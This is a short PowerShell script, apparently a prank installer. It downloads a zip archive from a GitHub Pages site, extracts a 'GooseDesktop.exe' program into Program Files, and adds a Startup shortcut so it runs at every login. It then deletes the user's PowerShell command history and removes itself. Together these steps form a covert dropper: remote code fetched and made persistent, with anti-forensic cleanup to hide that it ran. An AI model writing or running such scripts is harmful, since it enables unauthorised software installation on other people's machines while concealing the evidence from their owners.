# Download goose.zip
Invoke-WebRequest -Uri "https://blindman51.github.io/files/goose.zip" -OutFile "C:\Program Files\goose.zip"
# Unzip goose.zip
Expand-Archive -Path "C:\Program Files\goose.zip" -DestinationPath "C:\Program Files\goose" -Force
# Create shortcut in Startup
$s = (New-Object -COM WScript.Shell).CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Goose.lnk")
$s.TargetPath = "C:\Program Files\goose\GooseDesktop.exe"
$s.Save()
# Clean up PowerShell history
Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
#Delete Script
Remove-Item -Path $MyInvocation.MyCommand.Path -Force